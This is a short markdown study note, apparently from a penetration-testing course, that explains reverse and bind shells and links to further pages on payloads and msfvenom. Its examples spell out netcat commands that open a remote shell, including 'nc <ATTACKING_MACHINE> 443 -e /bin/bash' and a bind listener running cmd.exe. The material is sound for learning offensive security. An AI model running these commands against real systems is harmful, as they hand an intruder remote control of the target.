# Shells

- Shells are what we use when we are interfacing with a command line environment. (CLI)
- bash/sh are examples of shells in linux
- cmd.exe/powershell are examples of shells in windows
- when targeting remote systems it is sometimes possible to force an application into running arbitrary code.
- when this happens, we want to use this initial access to obtain a shell running on the target.

In simple terms,
- we can force the remote server to either send us command line access to the server **(a reverse shell)** or we can open up a port on the server which we can in order to execute further commands **(a bind shell)**
- So, we receive **reverse shells** and send **bind shells**

## Reverse Shell
- The target is forced to execute a piece of code that connects back to the computer.
- the attacking computer will have a listening port onto which the connection is received.
- reverse shells are good ways to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target
- but there is a pre-requisite that your incoming firewall should not block the reverse shell connection.

```
Example:-

# on the attacking machine

nc -lnvp 443

# on the target

nc <ATTACKING_MACHINE> 443 -e /bin/bash
```
## Bind Shell
- the code executed on the target invokes a listener on the target itself
- this would then be opened up to the internet, this means you can connect to the port that code has opened and obtain remote connection that way.
- this has the advantage of not configuring your network in anyway but the firewalls on the target side may block the connection to this newly opened port.

As a general rule, reverse shells are easier to connect and debug.

```
Example:- 

# on the attacking machine

nc <TARGET_MACHINE_IP> <PORT>

# on the target machine

nc -lnvp <port> -e cmd.exe

# this is what is called as remote code execution
```

## interactive and non-interactive shells

unfortunately most of the simple reverse and bind shells are non-interactive, which can make exploitation even trickier.
`where` is the output going is for you to find.

`listener` is often found in the attacking machines. It has an alias - `sudo rlwarp nc -lnvp 443`

## order of reading
- [ReadMe](./README.md)
- [tools](./tools.md)
- [stabilization techniques](./stabilization_techniques.md)
- [socat](./socat.md)
- [common shell payloads](./common_shell_payloads.md)
- [msfvenom](./msfvenom.md)
